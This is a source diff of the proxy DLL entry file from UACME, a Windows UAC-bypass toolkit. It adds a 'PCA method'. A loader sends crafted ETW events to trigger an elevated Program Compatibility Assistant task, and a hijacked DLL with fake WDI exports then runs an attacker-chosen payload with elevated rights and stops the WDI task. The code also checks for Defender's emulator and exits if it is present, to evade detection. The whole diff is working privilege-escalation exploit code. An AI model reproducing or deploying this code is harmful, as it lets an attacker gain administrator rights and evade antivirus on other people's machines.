@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2020
+*  (C) COPYRIGHT AUTHORS, 2014 - 2021
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.56
 *
-*  DATE:        14 Sep 2020
+*  DATE:        16 July 2021
 *
 *  Proxy dll entry point.
 *
@@ -18,9 +18,46 @@
 *******************************************************************************/
 
 #include "fubuki.h"
+#include <evntprov.h>
 
 UACME_PARAM_BLOCK g_SharedParams;
 HANDLE g_SyncMutant = NULL;
+
+/*
+* WdiGetDiagnosticModuleInterfaceVersion
+*
+* Purpose:
+*
+* Stub for fake WDI exports.
+*
+*/
+ULONG_PTR WINAPI WdiGetDiagnosticModuleInterfaceVersion(
+    VOID
+)
+{
+    OutputDebugString(L"[PCASTUB] WdiGetDiagnosticModuleInterfaceVersion called\r\n");
+    return 1;
+}
+
+/*
+* WdiStubGeneric
+*
+* Purpose:
+*
+* Stub for fake WDI exports.
+*
+*/
+ULONG_PTR WINAPI WdiStubGeneric(
+    ULONG_PTR UnusedParam1,
+    ULONG_PTR UnusedParam2
+)
+{
+    UNREFERENCED_PARAMETER(UnusedParam1);
+    UNREFERENCED_PARAMETER(UnusedParam2);
+
+    OutputDebugString(L"[PCASTUB] WdiStubGeneric called\r\n");
+    return 0;
+}
 
 /*
 * DummyFunc
@@ -243,6 +280,361 @@ BOOL WINAPI DllMain(
     return TRUE;
 }
 
+const ULONGLONG ZERO_VALUE = 0;
+
+/*
+* pcaEtwCall
+*
+* Purpose:
+*
+* Call etw write event.
+*
+*/
+ULONG pcaEtwCall()
+{
+    WCHAR szDebug[200];
+    CONST GUID providerGuid = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
+    CONST EVENT_DATA_DESCRIPTOR eventUserData[3] = {
+        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
+        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
+        {(UINT_PTR)NULL, 0}
+    };
+
+    EVENT_DESCRIPTOR eventDescriptor;
+    ULONG status = 0;
+
+    OutputDebugString(L"[PCALDR] pcaEtwCall\r\n");
+
+    eventDescriptor.Id = 0x1F46;
+    eventDescriptor.Version = 0;
+    eventDescriptor.Channel = 0x11;
+    eventDescriptor.Level = 4;
+    eventDescriptor.Opcode = 0;
+    eventDescriptor.Task = 0;
+    eventDescriptor.Keyword = 0x4000000000000100;
+
+    status = EtwEventWriteNoRegistration(
+        &providerGuid,
+        &eventDescriptor,
+        3,
+        (PEVENT_DATA_DESCRIPTOR)&eventUserData);
+
+    _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(1):");
+    ultohex(status, _strend(szDebug));
+    _strcat(szDebug, TEXT("\r\n"));
+    OutputDebugString(szDebug);
+
+    if (status == ERROR_SUCCESS) {
+
+        eventDescriptor.Id = 0x1F48;
+
+        status = EtwEventWriteNoRegistration(
+            &providerGuid,
+            &eventDescriptor,
+            3,
+            (PEVENT_DATA_DESCRIPTOR)&eventUserData);
+
+        _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(2):");
+        ultohex(status, _strend(szDebug));
+        _strcat(szDebug, TEXT("\r\n"));
+        OutputDebugString(szDebug);
+
+    }
+
+    return status;
+}
+
+/*
+* pcaStopWDI
+*
+* Purpose:
+*
+* Stop WDI task and exit loader.
+*
+*/
+ULONG pcaStopWDI()
+{
+    HRESULT hr;
+    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
+
+    OutputDebugString(L"[PCALDR] pcaStopWDI\r\n");
+    
+    hr = CoInitializeEx(NULL, 
+        COINIT_APARTMENTTHREADED | 
+        COINIT_DISABLE_OLE1DDE |
+        COINIT_SPEED_OVER_MEMORY);
+
+    if (SUCCEEDED(hr)) {
+
+        OutputDebugString(L"[PCALDR] CoInitializeEx success\r\n");
+
+        ucmSleep(1000);
+
+        if (ucmStopTaskByName(
+            TEXT("Microsoft\\Windows\\WDI"),
+            TEXT("ResolutionHost")))
+        {
+            OutputDebugString(L"[PCALDR] ucmStopTaskByName success\r\n");
+            ntStatus = STATUS_SUCCESS;
+        }
+
+        CoUninitialize();
+
+    }
+    else {
+        OutputDebugString(L"[PCALDR] CoInitializeEx failed\r\n");
+    }
+
+    return ntStatus;
+}
+
+/*
+* EntryPointExeModePCAMethod
+*
+* Purpose:
+*
+* Entry point to be used in exe mode with PCA method ONLY.
+*
+*/
+VOID WINAPI EntryPointExeModePCAMethod(
+    VOID)
+{
+    ULONG rLen = 0, status = 0;
+    LPCWSTR lpCmdline = GetCommandLine();
+    WCHAR szLoaderParam[MAX_PATH + 1];
+    WCHAR szDebug[MAX_PATH * 2];
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        RtlExitUserProcess('foff');
+    }
+
+    RtlSecureZeroMemory(szLoaderParam, sizeof(szLoaderParam));
+    GetCommandLineParam(lpCmdline, 0, (LPWSTR)&szLoaderParam, MAX_PATH, &rLen);
+
+    if (rLen) {
+
+        _strcpy(szDebug, L"[PCALDR] Loader parameter: ");
+        _strcat(szDebug, szLoaderParam);
+        _strcat(szDebug, L"\r\n");
+        OutputDebugString(szDebug);
+        
+        if (szLoaderParam[0] == TEXT('1')) {
+            status = pcaEtwCall();
+        }
+        else if (szLoaderParam[0] == TEXT('2')) {
+            status = pcaStopWDI();
+        }
+    }
+    else {
+        OutputDebugString(L"[PCALDR] Empty command line\r\n");
+    }
+   
+    RtlExitUserProcess(status);
+}
+
+typedef struct _PCA_LOADER_BLOCK {
+    ULONG OpResult;
+    WCHAR szLoader[MAX_PATH + 1];
+} PCA_LOADER_BLOCK, *PPCA_LOADER_BLOCK;
+
+/*
+* EntryPointDllPCAMethod
+*
+* Purpose:
+*
+* Entry point to be used in dll mode with PCA method ONLY.
+*
+*/
+BOOL WINAPI EntryPointDllPCAMethod(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+
+    HANDLE hSharedSection = NULL;
+    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;
+
+    NTSTATUS ntStatus;
+
+    SIZE_T viewSize = PAGE_SIZE;
+
+    HANDLE hSharedEvent = NULL;
+    WCHAR szObjectName[256];
+    WCHAR szName[128];
+    WCHAR szLoaderCmdLine[2];
+    WCHAR szLoader[MAX_PATH + 1];
+    WCHAR szDebug[1000];
+
+    UNICODE_STRING usName;
+    OBJECT_ATTRIBUTES obja;
+
+    PROCESS_INFORMATION processInfo;
+    STARTUPINFO startupInfo;
+
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        RtlExitUserProcess('f0ff');
+    }
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+
+        LdrDisableThreadCalloutsForDll(hinstDLL);
+
+        OutputDebugString(L"[PCADLL] Entry\r\n");
+
+        RtlSecureZeroMemory(&szName, sizeof(szName));
+        ucmGenerateSharedObjectName(FUBUKI_PCA_SECTION_ID, szName);
+
+        _strcpy(szDebug, L"[PCADLL] szName = ");
+        _strcat(szDebug, szName);
+        _strcat(szDebug, L" SessionId = ");
+        ultostr(NtCurrentPeb()->SessionId, _strend(szDebug));
+        _strcat(szDebug, L"\r\n");
+        OutputDebugString(szDebug);
+
+        hSharedSection = OpenFileMapping(FILE_MAP_WRITE, FALSE, szName);
+        if (hSharedSection) {
+
+            OutputDebugString(L"[PCADLL] OpenFileMapping success\r\n");
+
+            ntStatus = NtMapViewOfSection(
+                hSharedSection,
+                NtCurrentProcess(),
+                &pvLoaderBlock,
+                0,
+                PAGE_SIZE,
+                NULL,
+                &viewSize,
+                ViewUnmap,
+                MEM_TOP_DOWN,
+                PAGE_READWRITE);
+
+            if (NT_SUCCESS(ntStatus) && pvLoaderBlock) {
+
+                RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
+                _strncpy(szLoader, MAX_PATH, pvLoaderBlock->szLoader, MAX_PATH);
+
+                OutputDebugString(L"[PCADLL] NtMapViewOfSection success\r\n");
+
+                RtlSecureZeroMemory(&szName, sizeof(szName));
+                _strcpy(szObjectName, L"\\BaseNamedObjects\\");
+                ucmGenerateSharedObjectName(FUBUKI_PCA_EVENT_ID, szName);
+                _strcat(szObjectName, szName);
+
+                RtlInitUnicodeString(&usName, szObjectName);
+                InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+                if (NT_SUCCESS(NtOpenEvent(&hSharedEvent, EVENT_MODIFY_STATE, &obja))) {
+
+                    OutputDebugString(L"[PCADLL] NtOpenEvent OK\r\n");
+
+                    //
+                    // Read shared params block.
+                    //
+                    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+                    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+                    if (bSharedParamsReadOk) {
+                        OutputDebugString(L"[PCADLL] Shared parameters read OK\r\n");
+                        lpParameter = g_SharedParams.szParameter;
+                        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+                    }
+                    else {
+                        OutputDebugString(L"[PCADLL] Shared parameters defaulted\r\n");
+                        lpParameter = NULL;
+                        cbParameter = 0UL;
+                    }
+
+                    //
+                    // Reset windir environment variable.
+                    //
+                    SetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);
+
+                    //
+                    // Run payload.
+                    //
+                    if (ucmLaunchPayload(lpParameter, cbParameter)) {
+                        OutputDebugString(L"[PCADLL] Payload executed OK\r\n");
+                        pvLoaderBlock->OpResult = FUBUKI_PCA_PAYLOAD_RUN;
+                    }
+                    else {
+                        OutputDebugString(L"[PCADLL] Error during payload execution\r\n");
+                    }
+
+                    //
+                    // Restart loader with "2" param.
+                    //
+                    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+
+                    startupInfo.cb = sizeof(startupInfo);
+
+                    //
+                    // Set loader command line.
+                    //
+                    szLoaderCmdLine[0] = TEXT('2');
+                    szLoaderCmdLine[1] = 0;
+
+                    if (CreateProcess(
+                        szLoader,
+                        szLoaderCmdLine,
+                        NULL,
+                        NULL,
+                        FALSE,
+                        CREATE_NO_WINDOW,
+                        NULL,
+                        NULL,
+                        &startupInfo,
+                        &processInfo))
+                    {
+                        OutputDebugString(L"[PCADLL] Loader run OK\r\n");
+
+                        CloseHandle(processInfo.hThread);
+                        CloseHandle(processInfo.hProcess);
+                        pvLoaderBlock->OpResult |= FUBUKI_PCA_LOADER_RUN;
+                    }
+                    else {
+                        OutputDebugString(L"[PCADLL] Error during loader execution\r\n");
+                    }
+
+                    NtSetEvent(hSharedEvent, NULL);
+                    NtClose(hSharedEvent);
+                    OutputDebugString(L"[PCADLL] Shared event signaled\r\n");
+
+                    //
+                    // Notify Akagi.
+                    //
+                    if (bSharedParamsReadOk) {
+                        ucmSetCompletion(g_SharedParams.szSignalObject);
+                    }
+
+                }
+                else {
+                    OutputDebugString(L"[PCADLL] NtOpenEvent failed\r\n");
+                }
+
+                NtUnmapViewOfSection(NtCurrentProcess(), pvLoaderBlock);
+
+            }
+            else {
+                OutputDebugString(L"[PCADLL] MapViewOfFile failed\r\n");
+            }
+
+            NtClose(hSharedSection);
+
+        }
+        else {
+            OutputDebugString(L"[PCADLL] OpenFileMapping failed\r\n");
+        }
+
+    }
+
+    return TRUE;
+}
+
 /*
 * EntryPointExeMode
 *
@@ -252,7 +644,8 @@ BOOL WINAPI DllMain(
 *
 */
 VOID WINAPI EntryPointExeMode(
-    VOID)
+    VOID
+)
 {
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
         RtlExitUserProcess('foff');
@@ -269,7 +662,8 @@ VOID WINAPI EntryPointExeMode(
 *
 */
 VOID WINAPI EntryPointUIAccessLoader(
-    VOID)
+    VOID
+)
 {
     ULONG r;
     WCHAR szParam[MAX_PATH * 2];
